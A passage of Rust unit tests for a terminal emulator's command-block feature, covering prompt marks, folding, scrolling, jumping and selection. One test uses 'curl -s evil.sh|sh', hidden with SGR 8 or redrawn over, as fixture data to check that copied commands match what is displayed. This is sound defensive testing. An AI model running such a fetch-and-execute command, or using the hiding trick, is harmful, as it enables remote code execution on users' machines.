            assert_eq!(prompt_line(&term).as_deref(), Some("$"), "{clear:?}");
            term.advance(format!("c\r\n{C}").as_bytes());
            term.advance(format!("{}\r\n{}", "x".repeat(300), "x".repeat(39_000)).as_bytes());

            for block in term.blocks() {
                let rows = term.block_rows(block);
                if let Some(rows) = rows {
                    assert!(rows.output.is_none_or(|output| output >= rows.prompt));
                }
            }
        }
    }

    #[test]
    fn copied_commands_match_what_is_displayed() {
        // Text hidden with SGR 8 is shown as spaces and must not be copied.
        let hidden = format!(
            "{A}$ {B}ls\x1b[8m; curl -s evil.sh|sh\x1b[0m\r\n{C}{}{A}$ {B}",
            d(0)
        );
        // A line redrawn after the command was submitted.
        let redrawn = format!(
            "{A}$ {B}curl -s evil.sh|sh\r\n{C}\x1b[1A\r\x1b[2K$ ls -la\r\n{}{A}$ {B}",
            d(0)
        );
        for (output, shown) in [(hidden, "ls"), (redrawn, "ls -la")] {
            let term = terminal(6, 60, &output);
            let id = term.blocks()[0].id();
            assert_eq!(term.block_command(id).as_deref(), Some(shown), "{output:?}");
        }
    }

    /// Submitting a command checks only a bounded number of cells, so marks
    /// around a cursor that jumps down a tall, wide screen stay cheap.
    #[test]
    fn submitting_commands_stays_cheap_on_large_screens() {
        let mut term = Terminal::new(TerminalSize::new(60, 300));
        term.advance("x".repeat(60 * 300).as_bytes());
        let flood = format!("\x1b[H{A}{B}\x1b[59B{C}").repeat(20_000);

        let start = std::time::Instant::now();
        term.advance(flood.as_bytes());
        let elapsed = start.elapsed();

        assert!(
            elapsed < std::time::Duration::from_secs(2),
            "took {elapsed:?}"
        );
    }

    #[test]
    fn a_mark_deep_inside_a_wrapped_line_is_ignored() {
        let rows = MAX_WALK_ROWS as usize + 10;
        let long = "x".repeat(20 * rows);
        let term = terminal(5, 20, &format!("{long}{A}$ {B}"));

        assert!(term.blocks().is_empty());
    }

    #[test]
    fn blocks_survive_a_resize_behind_a_full_screen_program() {
        // Long lines in the scrollback, which the resize reflows unseen.
        let long = format!("{}\r\n", "x".repeat(25)).repeat(5);
        let mut term = terminal(6, 10, &run("cmd", &long, 0));
        assert!(term.history_size() > 0);
        term.advance(b"\x1b[?1049h");
        term.resize(TerminalSize::new(6, 30));
        term.advance(b"\x1b[?1049l");

        assert_eq!(term.blocks().len(), 2);
        let rows = term.block_rows(&term.blocks()[1]).expect("rows");
        let screen_row = rows.prompt - (term.history_size() - term.scroll_offset());
        assert_eq!(term.screen_lines()[screen_row], "$");
    }

    #[test]
    fn screens_list_the_blocks_in_view() {
        let output = format!(
            "{}second\r\n{C}b\r\nc\r\n{}{A}$ {B}",
            run("first", "a\r\n", 0),
            d(2)
        );
        let term = terminal(10, 30, &output);
        let blocks = term.screen().blocks;

        assert_eq!(blocks.len(), 3);
        assert_eq!(blocks[0].id, 1);
        assert_eq!(blocks[0].prompt_row, Some(0));
        // Each block ends where the next prompt starts.
        assert_eq!(blocks[0].rows, 0..2);
        assert_eq!(blocks[0].exit_code, Some(0));
        assert_eq!(blocks[1].rows, 2..5);
        assert_eq!(blocks[1].exit_code, Some(2));
        assert_eq!(blocks[2].state, BlockState::Prompt);
        assert_eq!(blocks[2].rows, 5..10);
    }

    #[test]
    fn blocks_above_the_view_are_clipped_or_left_out() {
        let lines = "x\r\n".repeat(20);
        let mut term = terminal(5, 30, &run("one", &lines, 0));
        term.advance(run("two", "y\r\n", 0).as_bytes());

        // At the bottom, the first block's prompt is far above the view.
        let blocks = term.screen().blocks;
        assert_eq!(blocks.first().map(|b| b.id), Some(1));
        assert_eq!(blocks[0].prompt_row, None);
        assert_eq!(blocks[0].rows.start, 0);

        // Scrolled to the very top, only the first block is in view.
        term.scroll(1_000);
        let blocks = term.screen().blocks;
        assert_eq!(blocks.len(), 1);
        assert_eq!(blocks[0].prompt_row, Some(0));
    }

    #[test]
    fn jumps_between_blocks() {
        let mut output = String::new();
        for name in ["one", "two", "three"] {
            output += &format!("{A}$ {B}{name}\r\n{C}{}{}", "o\r\n".repeat(8), d(0));
        }
        output += &format!("{A}$ {B}");
        let mut term = terminal(4, 30, &output);
        // The first row of the view, which follows the scroll position.
        let top_line = |term: &Terminal| {
            let screen = term.screen();
            let text: String = screen.row(0).iter().map(|cell| cell.ch).collect();
            text.trim_end().to_owned()
        };

        assert!(term.jump_to_block(-1));
        assert_eq!(top_line(&term), "$ three");
        assert!(term.jump_to_block(-1));
        assert_eq!(top_line(&term), "$ two");
        assert!(term.jump_to_block(-1));
        assert_eq!(top_line(&term), "$ one");
        assert!(!term.jump_to_block(-1), "no block before the first");
        assert!(term.jump_to_block(1));
        assert_eq!(top_line(&term), "$ two");
    }

    #[test]
    fn selects_a_block_output() {
        let mut term = terminal(10, 30, &run("ls", "alpha\r\nbeta\r\n", 0));

        assert!(term.select_block_output(1));
        assert_eq!(term.selection_text().as_deref(), Some("alpha\nbeta\n"));
        assert!(!term.select_block_output(2), "the prompt has no output");
        assert!(!term.select_block_output(9));
    }

    #[test]
    fn a_prompt_above_older_blocks_replaces_them() {
        // Inside a scroll region, text moves up without reaching the
        // scrollback, so a new prompt can land above an older block.
        let mut term = terminal(
            4,
            30,
            &format!("\x1b[2;4r{}", run("one", "a\r\nb\r\nc\r\n", 0)),
        );
        term.advance(format!("\x1b[H{A}$ {B}").as_bytes());

        let blocks = term.screen().blocks;
        assert!(
            blocks
                .windows(2)
                .all(|pair| pair[0].rows.start <= pair[1].rows.start),
            "{blocks:?}"
        );
        assert_eq!(
            term.blocks().last().map(Block::state),
            Some(BlockState::Prompt)
        );
    }

    #[test]
    fn collapsing_folds_a_block_output() {
        let listing: String = (1..=6).map(|n| format!("file{n}\r\n")).collect();
        let mut term = terminal(
            8,
            30,
            &format!("{}{}", run("ls", &listing, 0), run("pwd", "/home\r\n", 0)),
        );
        let lines = |term: &Terminal| -> Vec<String> {
            let screen = term.screen();
            (0..screen.rows)
                .map(|row| {
                    let text: String = screen.row(row).iter().map(|cell| cell.ch).collect();
                    text.trim_end().to_owned()
                })
                .collect()
        };
        let before = lines(&term);

        assert_eq!(term.toggle_collapsed(1), Some(true));
        let folded = lines(&term);
        assert!(folded.contains(&"$ ls".to_owned()), "{folded:?}");
        assert!(
            folded.contains(&"  \u{22ef} 6 lines hidden".to_owned()),
            "{folded:?}"
        );
        assert!(
            !folded.iter().any(|line| line.starts_with("file")),
            "{folded:?}"
        );
        assert!(
            folded.iter().any(|line| line.ends_with("$ pwd")),
            "{folded:?}"
        );
        let blocks = term.screen().blocks;
        assert!(blocks[0].collapsed);
        assert_eq!(
            blocks[1].prompt_row,
            blocks[0].prompt_row.map(|row| row + 2)
        );

        // Clicking below the fold maps to the right line.
        let pwd_row = folded
            .iter()
            .position(|line| line == "/home")
            .expect("output row");
        term.start_selection(
            crate::SelectionKind::Line,
            crate::SelectionPoint::new(pwd_row, 0),
        );
        assert_eq!(term.selection_text().as_deref(), Some("/home\n"));

        assert_eq!(term.toggle_collapsed(1), Some(false));
        assert_eq!(lines(&term), before);
    }

    fn view_lines(term: &Terminal) -> Vec<String> {
        let screen = term.screen();
        (0..screen.rows)
            .map(|row| {
                let text: String = screen.row(row).iter().map(|cell| cell.ch).collect();
                text.trim_end().to_owned()
            })
            .collect()
    }

    #[test]
    fn a_fold_near_the_top_of_the_scrollback_is_shown_once() {
        let lines = "x\r\n".repeat(20);
        let mut term = terminal(
            5,
            30,
            &format!("{}two\r\n{C}y\r\n{}{A}$ {B}", run("one", &lines, 0), d(0)),
        );
        term.toggle_collapsed(1);
        term.scroll(1_000);

        let shown = view_lines(&term);
        let summaries = shown
            .iter()
            .filter(|line| line.contains("lines hidden"))
            .count();
        assert_eq!(summaries, 1, "{shown:?}");
        assert_eq!(shown[0], "$ one", "{shown:?}");
    }

    #[test]
    fn scrolling_across_a_fold_moves_on_every_step() {
        let lines = "x\r\n".repeat(50);
        let mut output = run("one", &lines, 0);
        for n in 0..8 {
            output += &format!("c{n}\r\n{C}o{n}\r\n{}{A}$ {B}", d(0));
        }
        let mut term = terminal(5, 30, &output);
        term.toggle_collapsed(1);

        // Every step changes what is shown, until the first prompt is on top.
        let mut previous = view_lines(&term);
        let mut steps = 0;
        while previous[0] != "$ one" {
            term.scroll(1);
            let shown = view_lines(&term);
            assert_ne!(shown, previous, "step {steps} did nothing");
            previous = shown;
            steps += 1;
            assert!(steps < 30, "never reached the top");
        }
        // 19 rows in view (the fold counts as one) on a 5-row screen.
        assert_eq!(steps, 14);
    }

    #[test]
    fn jumping_with_folds_puts_the_prompt_on_top() {
        let lines = "z\r\n".repeat(30);
        let mut output = run("zero", &lines, 0);
        for name in ["one", "two"] {
            output += &format!("{name}\r\n{C}{}{}{A}$ {B}", "o\r\n".repeat(6), d(0));
        }
        let mut term = terminal(5, 30, &output);
        term.toggle_collapsed(1);

        assert!(term.jump_to_block(-1));
        assert!(term.jump_to_block(-1));
        let shown = view_lines(&term);
        assert!(shown[0].ends_with("one"), "{shown:?}");
    }

    #[test]
    fn only_finished_blocks_with_output_collapse() {
        let mut term = terminal(
            6,
            30,
            &format!("{}{A}$ {B}sleep\r\n{C}", run("true", "", 0)),
        );
        assert_eq!(term.toggle_collapsed(1), None, "no output");
        assert_eq!(term.toggle_collapsed(2), None, "still running");
        assert_eq!(term.toggle_collapsed(7), None, "no such block");
    }

    #[test]
    fn full_screen_programs_hide_blocks() {
        let mut term = terminal(5, 30, &run("vim", "", 0));
        term.advance(b"\x1b[?1049h");
        assert!(term.screen().blocks.is_empty());
        assert!(!term.jump_to_block(-1));
    }

    #[test]
    fn ignores_marks_on_the_alternate_screen() {
        let term = terminal(5, 20, &format!("\x1b[?1049h{A}$ {B}"));
        assert!(term.blocks().is_empty());
    }

    #[test]
    fn awaits_a_command_only_with_an_empty_line_after_the_input_mark() {
        // Without integration, nothing is awaited.
        assert_eq!(terminal(5, 20, "$ ").awaiting_command(), None);
        // The prompt is drawn but the input has not started yet.
        assert_eq!(terminal(5, 20, &format!("{A}$ ")).awaiting_command(), None);

        let term = terminal(5, 20, &format!("{A}$ {B}"));
        let id = term.blocks()[0].id();
        assert_eq!(term.awaiting_command(), Some(id));
        assert_eq!(term.screen().awaiting_command, Some(id));

        // Text in the shell's own line (typed ahead or handed off) is left
        // to the shell.
        assert_eq!(
            terminal(5, 20, &format!("{A}$ {B}ls")).awaiting_command(),
            None
        );
        // A running command is not waiting for one.
        assert_eq!(
            terminal(5, 20, &format!("{A}$ {B}ls\r\n{C}")).awaiting_command(),
            None
        );
        // The next prompt is awaited again.
        let term = terminal(10, 40, &run("ls", "one\r\n", 0));
        assert_eq!(term.awaiting_command(), Some(term.blocks()[1].id()));
    }

    #[test]
    fn the_command_prompt_stays_while_the_cursor_moves() {
        let term = terminal(5, 20, &format!("{A}$ {B}"));
        let id = term.blocks()[0].id();
        assert_eq!(term.screen().command_prompt, Some(id));

        // Background output moves the cursor: the line may no longer be
        // empty, but the prompt is still waiting for its command.
        let moved = terminal(5, 20, &format!("{A}$ {B}hi\r\n"));
        assert_eq!(moved.screen().awaiting_command, None);
        assert_eq!(moved.screen().command_prompt, Some(id));

        assert_eq!(
            terminal(5, 20, &format!("{A}$ {B}ls\r\n{C}"))
                .screen()
                .command_prompt,
            None
        );
        assert_eq!(
            terminal(5, 20, &format!("{A}$ ")).screen().command_prompt,
            None
        );
    }

    #[test]
    fn awaits_no_command_on_the_alternate_screen() {
        let mut term = terminal(5, 20, &format!("{A}$ {B}"));
        term.advance(b"\x1b[?1049h");
        assert_eq!(term.awaiting_command(), None);
        assert_eq!(term.screen().awaiting_command, None);
        term.advance(b"\x1b[?1049l");
        assert!(term.awaiting_command().is_some());
    }
}
